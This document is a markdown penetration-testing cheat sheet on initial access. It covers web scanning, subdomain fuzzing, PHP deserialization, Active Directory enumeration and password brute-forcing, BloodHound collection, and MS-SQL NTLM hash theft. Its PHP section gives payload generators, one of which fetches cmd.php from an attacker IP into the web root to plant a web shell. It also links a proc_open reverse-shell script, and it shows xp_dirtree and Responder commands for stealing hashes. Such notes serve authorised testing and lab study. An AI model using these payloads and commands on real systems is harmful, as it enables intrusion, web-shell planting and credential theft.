# Initial Access

- [Initial Access](#initial-access)
  - [Pentesting Web](#pentesting-web)
    - [Scanning tools](#scanning-tools)
      - [Nikto](#nikto)
      - [WPScan](#wpscan)
    - [DNS enumeration](#dns-enumeration)
    - [PHP Vulnerabilities](#php-vulnerabilities)
      - [Local PHP Security Checker](#local-php-security-checker)
      - [proc\_open() function](#proc_open-function)
      - [Deserialization](#deserialization)
        - [Use of the save() function on a class](#use-of-the-save-function-on-a-class)
        - [construct() \& destruct() function code execution](#construct--destruct-function-code-execution)
  - [Pentesting LDAP](#pentesting-ldap)
    - [LDAP Recon](#ldap-recon)
      - [Throught RPC](#throught-rpc)
      - [Throught SMB](#throught-smb)
      - [Throught Kerberos](#throught-kerberos)
    - [LDAP login bruteforce](#ldap-login-bruteforce)
    - [Bloodhound](#bloodhound)
    - [Data collector](#data-collector)
    - [PowerView / Sharpview](#powerview--sharpview)
  - [Pentesting MS-SQL](#pentesting-ms-sql)
    - [Steal NTLM hash](#steal-ntlm-hash)

## Pentesting Web

### Scanning tools

#### Nikto

Nikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items.

```bash
nikto -host <URL>
```

> **Github:** https://github.com/sullo/nikto

#### WPScan

WPScan is a free, for non-commercial use, black box WordPress security scanner written for security professionals and blog maintainers to test the security of their sites.

```bash
wpscan --rua -e ap,at,tt,cb,dbe,u,m --plugins-detection aggressive --url <URL>
```

> **Github:** https://github.com/wpscanteam/wpscan

### DNS enumeration

**Using wfuzz**

```bash
wfuzz -c -u "http://<ADDRESS>" -w /usr/share/wordlists/subdomains-top1mil.txt -H "Host: FUZZ.<ADDRESS>"
```

Useful options
- `-H`: Used to set custom header
- `--hc/hl/hw/hh`: Hide responses with the specified code/lines/words/chars
- `--sc/sl/sw/sh`: Show responses with the specified code/lines/words/chars

**Using ffuf**

```bash
ffuf -w /usr/share/wordlists/subdomains-top1mil.txt -H "Host: FUZZ.<ADDRESS>" -u http://<ADDRESS>
```

Useful options
- `-H`: Used to set custom header
- `-fc`: Filter HTTP status codes from response

**Using dig**

```bash
dig srv <DOMAIN> @<IP>
# example
# dig srv toto.com @10.0.0.10
```

### PHP Vulnerabilities

#### Local PHP Security Checker

The Local PHP Security Checker is a command line tool that checks if your PHP application depends on PHP packages with known security vulnerabilities. It uses the [Security Advisories Database](https://github.com/FriendsOfPHP/security-advisories) behind the scenes.

> **Local PHP Security Checker:** https://github.com/fabpot/local-php-security-checker

#### proc_open() function

You can get a reverse shell from the `proc_open()` php function using [this script](./files/proc_open_RS.php).

When *PHP safe_mode* is enabled, you can bypass it using the `proc_open()` function.

> Reference: [disable_functions bypass - PHP safe_mode bypass via proc_open() and custom environment Exploit](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-safe_mode-bypass-via-proc_open-and-custom-environment-exploit)

#### Deserialization

##### Use of the save() function on a class

```php
<?php
class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

$payload = new AvatarInterface();
$payload->tmp = 'http://10.10.16.9:8000/cmd.php';
$payload->imgPath = '/var/www/html/cmd.php';
$payload = base64_encode(serialize($payload));
print($payload);
```

##### construct() & destruct() function code execution

```php
<?php
namespace App\Service;
class Logger
{
    private $log_me;
    function __construct($log_me)
    {
        $this->log_me = $log_me;
    }
}
echo base64_encode(
    serialize(
        new Logger("echo 'hello from the other side' > /tmp/poc_unserialize")
    )
);
```

## Pentesting LDAP

Collection of method & path to pentest LDAP service.

You can find [here](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg) a SVG Mindmap that describe paths to the Domain Admin. A saved version can be found at [./files/pentest_ad_dark_2022.svg](./files/pentest_ad_dark_2022.svg)

### LDAP Recon

#### Throught RPC

Check if we can connect into RPC in anonymous.

```bash
rpcclient -U '' -N <IP>
```

If we got an access run `enum4linux` to enumerate users, groups, shares, etc

```bash
enum4linux <IP>
```

#### Throught SMB

**Metasploit modules**
- auxiliary/scanner/smb/smb_lookupsid : sids lookup

#### Throught Kerberos

Find valid users using kerbrute: https://github.com/ropnop/kerbrute

```bash
# enum user
./kerbrute_linux_amd64 userenum -d <DOMAIN> --dc <DC_IP> <WORDLIST>
```

### LDAP login bruteforce

**Using crackmapexec**

```bash
crackmapexec smb <IP> -d <DOMAIN> -u usernames.txt -p password
```

### Bloodhound

BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify.

```bash
# start neo4j server
neo4j console &

# start bloodhound
bloodhound &
# neo4j:root > import *.json
```

Reqs:
- Need neo4j v4
- sudo update-alternatives --config java (select jdk11)

> **Github:** https://github.com/BloodHoundAD/BloodHound

### Data collector

**[bloodhound-python](https://github.com/fox-it/BloodHound.py)**

Dump remotly. Python script.

```bash
# dump ldap infos
bloodhound-python -u <USER> -p <PASSWORD> -d <DOMAIN> -c ALL -ns <IP>
```

**[SharpHound](https://github.com/BloodHoundAD/SharpHound)**

Dump locally. Binary.

```bash
.\SharpHound.exe --memcache -c all -d <DOMAIN> -DomainController <IP>
```

**[adPEAS](https://github.com/61106960/adPEAS)**

Dump locally. Powershell script.

```bash
Import-Module .\adPEAS.ps1
Invoke-adPEAS -Domain '<DOMAIN>'
```

### PowerView / Sharpview

PowerView is a PowerShell tool to gain network situational awareness on Windows domains.

> **Github (archive):** https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
> **HTB Docs:** https://academy.hackthebox.com/course/preview/active-directory-powerview/powerviewsharpview-overview--usage

SharpView is a .NET port of PowerView

> **Github:** https://github.com/tevora-threat/SharpView
> **Cheatsheet:** https://csbygb.gitbook.io/pentips/windows/post-compromise-enum/powerview-sharpview

## Pentesting MS-SQL

### Steal NTLM hash

```bash
# use responder
└─$ sudo responder -I <IP> -w -d                            

# steal from msfconsole
use admin/mssql/mssql_ntlm_stealer
set SMBPROXY <IP>
exploit

# steal from ms-sql console
SQL> exec master.dbo.xp_dirtree '\\<IP>' 

```